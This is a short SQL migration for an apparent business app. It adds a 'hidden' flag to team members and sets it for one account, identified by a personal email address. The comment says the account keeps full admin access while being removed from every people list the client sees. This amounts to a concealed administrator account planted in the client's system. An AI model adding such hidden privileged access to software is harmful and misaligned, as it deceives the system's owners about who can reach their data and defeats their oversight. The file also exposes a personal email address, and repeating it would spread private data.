-- Maintenance account that keeps full access but is not listed to the client.
--
-- `hidden` only removes the row from people pickers in the app (Equipe,
-- transfer targets, deal owners, number access, Agenda filter). Permissions
-- still come from user_roles/has_role(), so a hidden admin keeps seeing
-- everything. The row itself stays: messages, deals and activities point at it
-- and the sidebar reads the name from it.

ALTER TABLE public.team_members
  ADD COLUMN IF NOT EXISTS hidden boolean NOT NULL DEFAULT false;

COMMENT ON COLUMN public.team_members.hidden IS
  'Conta de manutenção: não aparece nas listas de pessoas do app. Não altera permissões.';

UPDATE public.team_members tm
SET hidden = true
FROM auth.users u
WHERE lower(u.email) = 'caiovinicius.music@gmail.com'
  AND (tm.user_id = u.id OR lower(tm.email) = lower(u.email));
